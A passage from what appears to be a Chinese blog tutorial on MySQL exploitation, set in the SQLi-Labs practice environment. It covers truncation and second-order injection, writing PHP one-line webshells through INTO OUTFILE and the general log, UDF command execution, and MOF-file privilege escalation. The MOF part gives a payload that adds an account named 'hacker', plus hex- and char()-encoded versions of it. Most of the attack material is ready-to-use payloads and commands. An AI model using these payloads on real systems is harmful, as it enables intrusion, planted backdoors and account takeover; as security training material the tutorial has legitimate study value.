<td>TRADITIONAL</td>
<td>传统模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误。用于事务时，会进行事务的回滚。</td>
</tr>
<tr>
<td>STRICT_TRANS_TABLES</td>
<td>严格模式，进行数据的严格校验，错误数据不能插入，报error错误。</td>
</tr>
</tbody>
</table>
</div>
<p>默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error（<strong>如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告。</strong>）。</p>
<p>其实这个注入姿势很难找到了，因为它需要满足以下条件：</p>
<ul>
<li>可以注册用户，而且可以注册带有空格的用户</li>
<li>你需要知道管理员的账号</li>
</ul>
<p>查看以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table test(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; username varchar(20),</span><br><span class="line">    -&gt; password varchar(30)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.31 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into test(id,username,password) values(1,&quot;admin                                                                                            hello  &quot;,&quot;aaaaaaaa&quot;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,username,password from test;</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">| id   | username             | password |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">|    1 | admin                | aaaaaaaa |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>
<p>username的最大长度是20，可是我插入的明显超过20，而在使用select查询的时候，username超过的部分被截取掉了。</p>
<p>倘若现在有一个sql语句，它可以是完完全全的没有注入，但是如果允许空字符注册的话，那么就会导致我们今天的这个“<strong>长字符串截断注入</strong>”</p>
<p><code>select id,username,password from users where username = &#39;admin&#39;;</code></p>
<p>假设管理员的账号就是“admin”，那么我们就去注册一个“admin ”的用户。（PS:后面有哦很多空格哦，等待被截取掉就直接替换掉admin这个账号了）危害还是很大的。</p>
<h3 id="超长字符截断靶场复现"><a href="#超长字符截断靶场复现" class="headerlink" title="超长字符截断靶场复现"></a>超长字符截断靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p><img src="https://i.loli.net/2021/10/05/faQeIJ59dloznKN.png" alt="2003511573ceb082806180fa25fe5ab5.png"></p>
<p>注册用户名：admin x</p>
<p>注册密码：123456</p>
<p>查看数据库，可以看到新增用户为admin，密码为123456</p>
<p><img src="https://i.loli.net/2021/10/05/AeX1dLM84ogvQlE.png" alt="e476c758349289994a637ae30c247986.png"></p>
<p>我们使用 用户名：admin，密码：123456 进行登录</p>
<p><img src="https://i.loli.net/2021/10/05/K5cnb3vFGq1pWiX.png" alt="e6d78a5ad298d6acc1b88e3900497836.png"></p>
<p>成功登录</p>
<p><img src="https://i.loli.net/2021/10/05/izyasOlLv49hJXS.png" alt="83359b1ee4f08aea03d80ad2818095a3.png"></p>
<p>不过这里登录的其实还是第2个admin用户，所以并不能通过此用户更改原admin的密码</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p><strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-b024d9bb4acded26.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp" alt="img"></p>
<h3 id="二次注入靶场复现"><a href="#二次注入靶场复现" class="headerlink" title="二次注入靶场复现"></a>二次注入靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p>打开页面可以看到一个登陆界面，尝试用<code>admin&#39;#</code>进行注入，失败。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-f955882874b3b8e5.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/897/format/webp" alt="img"></p>
<p>部分源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到使用了<code>mysql_real_escape_string</code>进行转义处理，无法进行SQL注入。</p>
<p>继续研究，发现登陆页面可以进行用户注册，这里我们注册一个<code>admin&#39;#</code>的账号，登陆该账号后可以进行密码修改。</p>
<p><img src="https://i.loli.net/2021/10/05/wpWX3nPFgtvb6HG.png" alt="e912e4b8aedd8e35cb1b73b1be333743.png"></p>
<p>注册新用户过程中的处理代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">    <span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print_r($row);</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;alert(<span class="string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:1, url=new_user.php&#x27;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">                mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Error Creating your user account,  : &#x27;</span>.mysql_error());</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">              ··················</span><br></pre></td></tr></table></figure>
<p>可以看到传入的<code>username</code>、<code>password</code>、<code>re_password</code>仍均被<code>mysql_escape_string</code>进行了转义处理，但是在数据库中还是插入了<code>admin&#39;#</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-33fef276cb14df54.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/245/format/webp" alt="img"></p>
<p>这是因为当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。</p>
<p>这时，我们用<code>admin&#39;#</code>登陆，并进行密码修改，密码修改为<code>123456</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-a7d9b6711a5b608a.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/946/format/webp" alt="img"></p>
<p>执行后，查看数据库数据：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-11f6fd66afb30739.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/224/format/webp" alt="img"></p>
<p>可以看到<code>admin</code>的密码由原来的<code>123</code>修改为<code>123456</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">这是因为上面的数据库更新语句，在用户名为 <span class="string">&quot;admin&#x27;#&quot;</span> 时执行的实际是：</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
<p>因为我们将问题数据存储到了数据库，而程序再取数据库中的数据的时候没有进行二次判断便直接带入到代码中，从而造成了二次注入。</p>
<h2 id="利用SQL注入写WebShell"><a href="#利用SQL注入写WebShell" class="headerlink" title="利用SQL注入写WebShell"></a>利用SQL注入写WebShell</h2><p>写WebShell的必要条件就是拥有读写文件的权限。这个在讲带外查询的时候已经讲到过了，让我们再来回顾一下。</p>
<p>注：写Webshell之前需要知道Web根目录的绝对路径。</p>
<blockquote>
<p>获取Web根目录路径的方式：</p>
<ul>
<li>报错显示</li>
<li>遗留文件，phpinfo()</li>
<li>漏洞爆路径</li>
<li>读取配置文件</li>
</ul>
</blockquote>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>注意：在Linux系统中，MySQL只是服务用户，默认没有对Web根目录有读写权限，除非能找到Web根目录下有对其他用户写入权限的目录才能写WebShell。</p>
<h3 id="利用Union-Select写入"><a href="#利用Union-Select写入" class="headerlink" title="利用Union Select写入"></a>利用Union Select写入</h3><p>这是最常见的写入方式，<code>union</code> 跟<code>select into outfile</code>，将一句话写入<code>evil.php</code>，仅适用于联合注入。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户File权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>
<p>也可将一句话木马进行Hex编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>
<p>这时，服务器的WEB根目录会多出一个<code>evil.php</code>的文件</p>
<p><img src="https://i.loli.net/2021/10/05/vEIkStXAfrbBq4M.png" alt="b79e8369bd05be28c62563d03e6b1a97.png"></p>
<p>验证一句话木马能否成功执行命令</p>
<p><img src="https://i.loli.net/2021/10/05/bHgSr2EWGaUMcdt.png" alt="b942d634209c5ed1ea971f002adb0490.png"></p>
<p>有关WebShell的内容在之后会详细讲解。</p>
<h3 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h3><p>当MySql注入的攻击方式为盲注或报错，<code>Union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>SQLMAP</code>的 <code>--os-shell</code>命令，所采用的就是一下这种方式。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户<code>File</code>权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; limit 0,1 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e --+</span><br></pre></td></tr></table></figure>
<p>同样的技巧，一共有四种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    	（一句话hex编码）#</span><br></pre></td></tr></table></figure>
<h3 id="利用Log写入"><a href="#利用Log写入" class="headerlink" title="利用Log写入"></a>利用Log写入</h3><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p>
<p>具体权限要求：数据库用户需具备<code>Super</code>和<code>File</code>服务器权限、获取物理路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; 		#查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;			#开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27;;	#设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;		#写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;			#关闭general log模式</span><br></pre></td></tr></table></figure>
<h2 id="UDF提权执行系统命令"><a href="#UDF提权执行系统命令" class="headerlink" title="UDF提权执行系统命令"></a>UDF提权执行系统命令</h2><p><strong>什么是UDF?</strong></p>
<p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<p><strong>如何使用UDF？</strong></p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>拥有可以将udf.dll写入相应目录的权限。</li>
</ul>
<h3 id="上传udf动态链接库"><a href="#上传udf动态链接库" class="headerlink" title="上传udf动态链接库"></a>上传udf动态链接库</h3><p>如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。</p>
<p><img src="https://i.loli.net/2021/10/05/3EfYS6chvKqUpOu.png" alt="babe58af0410a5eafe6deafbf1c33475.png"></p>
<p>在sqlmap中可以导入udf，由于sqlmap中自带的这些链接库为了防止误杀都经过编码处理，不能直接使用，需要使用sqlmap自带的解码工具cloak.py进行解码。</p>
<p><img src="https://i.loli.net/2021/10/05/Xv9lW4RHBgMp3b8.png" alt="img"></p>
<p>可以使用WebShell管理工具导入，这里就直接手工粘贴进去了</p>
<p><img src="https://i.loli.net/2021/10/05/46NVe7cTSPitLy3.png" alt="013854ab7b29796f6a1e56e597e5d234.png"></p>
<h3 id="引用共享库文件创建存储函数"><a href="#引用共享库文件创建存储函数" class="headerlink" title="引用共享库文件创建存储函数"></a>引用共享库文件创建存储函数</h3><p>存储函数创建语法：</p>
<p><img src="https://i.loli.net/2021/10/05/jO4lG1CgpuaNfTD.png" alt="image-20200704183408625"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>只有两个变量，一个是function_name（函数名），我们想引入的函数是<code>sys\_eval</code>。还有一个变量是<code>shared\_library\_name</code>（共享包名称），即<code>lib_mysqludf_sys.dll</code>。</p>
<p><img src="https://i.loli.net/2021/10/05/7cfCkNzYjZ9rJ5p.png" alt="d98f562a1bba6b244b906a1082acd262.png"></p>
<p>接下来我们就可以使用我们创建的<code>sys_eval()</code>函数执行系统命令了。</p>
<p><img src="https://i.loli.net/2021/10/05/D2skxSNlTy5bzXZ.png" alt="7ec7d8ef81940a743c553ffb10b58936.png"></p>
<h2 id="MOF提权执行系统命令"><a href="#MOF提权执行系统命令" class="headerlink" title="MOF提权执行系统命令"></a>MOF提权执行系统命令</h2><h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>介绍</strong></p>
<p>MOF文件是<code>mysql</code>数据库的扩展（<code>C:\WINDOWS\system32\wbem\mof</code>）叫做”托管对象格式”，其作用是每隔60s就会去监控进程创建和死亡，因为MOF文件每60s就会执行，且是系统权限，所以如果我们有权限替换原有的MOF文件，就能获得<strong>system</strong>权限。</p>
<p>执行成功写入MOF文件会出现在<code>C:\WINDOWS\system32\wbem\mof\good</code>目录下，否则出现在<code>C:\WINDOWS\system32\wbem\mof\bad</code>目录下。</p>
<p><strong>利用条件</strong></p>
<ul>
<li>Windows &lt;= 2003</li>
<li>拥有<code>mysql</code>数据库的账号，且账号有写入权限</li>
<li><code>mysql</code>在<code>C:\WINDOWS\system32\wbem\mof</code>目录有写入权限</li>
</ul>
<p><strong>实验环境</strong></p>
<ul>
<li><p>系统：Windows Server 2003 Enterprise x64 Edition</p>
</li>
<li><p>数据库：MySQL 5.1.52</p>
</li>
</ul>
<h3 id="有WebShell提权"><a href="#有WebShell提权" class="headerlink" title="有WebShell提权"></a>有WebShell提权</h3><p>新建一个user.mof文件，内容如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">&quot;\\\\.\\root\\subscription&quot;</span>)</span></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker Admin12345 /add\&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>将该文件上传到目标主机中，然后执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;C:\\Wamp\\WebCode\\bWAPP_latest\\user.mof&#x27;) into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br><span class="line"></span><br><span class="line">#注：这里只能用into dumpfile，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</span><br></pre></td></tr></table></figure>
<p>可以看到，成功执行了<code>net user hacker Admin12345 /add</code>命令，添加了一个hacker用户，接下来再用同样的方法执行<code>net localgroup administrators hacker /add</code>命令便可提权至管理员权限。</p>
<p><img src="https://i.loli.net/2021/10/05/Ptv2C48fLVOmpy3.png" alt="image-20211005182707344"></p>
<h3 id="无WebShell提权"><a href="#无WebShell提权" class="headerlink" title="无WebShell提权"></a>无WebShell提权</h3><h4 id="16进制写入"><a href="#16进制写入" class="headerlink" title="16进制写入"></a>16进制写入</h4><p>写一个python脚本将evil.mof文件转化为16进制，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">hex1 = binascii.hexlify(content)</span><br><span class="line"><span class="built_in">hex</span> = <span class="built_in">str</span>(hex1,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>)</span><br></pre></td></tr></table></figure>
<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e22290d0a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c7465720d0a7b0d0a4576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b0d0a4e616d65203d202266696c745032223b0d0a5175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e7420220d0a22576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c2220220d0a22416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b0d0a51756572794c616e6775616765203d202257514c223b0d0a7d3b0d0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d65720d0a7b0d0a4e616d65203d2022636f6e735043535632223b0d0a536372697074696e67456e67696e65203d20224a536372697074223b0d0a53637269707454657874203d0d0a2276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e6578652075736572206576696c204162636431323334202f6164645c2229223b0d0a7d3b0d0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e670d0a7b0d0a436f6e73756d6572203d2024436f6e73756d65723b0d0a46696c746572203d20244576656e7446696c7465723b0d0a7d3b into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="ASCII写入"><a href="#ASCII写入" class="headerlink" title="ASCII写入"></a>ASCII写入</h4><p>写一个python脚本将evil.mof的文件内容转化为ascii码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line">asc1 = np.frombuffer(a, dtype=np.uint8)</span><br><span class="line">asc = asc1.tolist()</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br></pre></td></tr></table></figure>
<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select char(35, 112, 114, 97, 103, 109, 97, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 40, 34, 92, 92, 92, 92, 46, 92, 92, 114, 111, 111, 116, 92, 92, 115, 117, 98, 115, 99, 114, 105, 112, 116, 105, 111, 110, 34, 41, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 32, 97, 115, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 13, 10, 123, 13, 10, 69, 118, 101, 110, 116, 78, 97, 109, 101, 115, 112, 97, 99, 101, 32, 61, 32, 34, 82, 111, 111, 116, 92, 92, 67, 105, 109, 118, 50, 34, 59, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 102, 105, 108, 116, 80, 50, 34, 59, 13, 10, 81, 117, 101, 114, 121, 32, 61, 32, 34, 83, 101, 108, 101, 99, 116, 32, 42, 32, 70, 114, 111, 109, 32, 95, 95, 73, 110, 115, 116, 97, 110, 99, 101, 77, 111, 100, 105, 102, 105, 99, 97, 116, 105, 111, 110, 69, 118, 101, 110, 116, 32, 34, 13, 10, 34, 87, 104, 101, 114, 101, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 32, 73, 115, 97, 32, 92, 34, 87, 105, 110, 51, 50, 95, 76, 111, 99, 97, 108, 84, 105, 109, 101, 92, 34, 32, 34, 13, 10, 34, 65, 110, 100, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 46, 83, 101, 99, 111, 110, 100, 32, 61, 32, 53, 34, 59, 13, 10, 81, 117, 101, 114, 121, 76, 97, 110, 103, 117, 97, 103, 101, 32, 61, 32, 34, 87, 81, 76, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 65, 99, 116, 105, 118, 101, 83, 99, 114, 105, 112, 116, 69, 118, 101, 110, 116, 67, 111, 110, 115, 117, 109, 101, 114, 32, 97, 115, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 13, 10, 123, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 99, 111, 110, 115, 80, 67, 83, 86, 50, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 105, 110, 103, 69, 110, 103, 105, 110, 101, 32, 61, 32, 34, 74, 83, 99, 114, 105, 112, 116, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 84, 101, 120, 116, 32, 61, 13, 10, 34, 118, 97, 114, 32, 87, 83, 72, 32, 61, 32, 110, 101, 119, 32, 65, 99, 116, 105, 118, 101, 88, 79, 98, 106, 101, 99, 116, 40, 92, 34, 87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101, 108, 108, 92, 34, 41, 92, 110, 87, 83, 72, 46, 114, 117, 110, 40, 92, 34, 110, 101, 116, 46, 101, 120, 101, 32, 117, 115, 101, 114, 32, 101, 118, 105, 108, 32, 65, 98, 99, 100, 49, 50, 51, 52, 32, 47, 97, 100, 100, 92, 34, 41, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 70, 105, 108, 116, 101, 114, 84, 111, 67, 111, 110, 115, 117, 109, 101, 114, 66, 105, 110, 100, 105, 110, 103, 13, 10, 123, 13, 10, 67, 111, 110, 115, 117, 109, 101, 114, 32, 61, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 59, 13, 10, 70, 105, 108, 116, 101, 114, 32, 61, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 59, 13, 10, 125, 59) into dumpfile 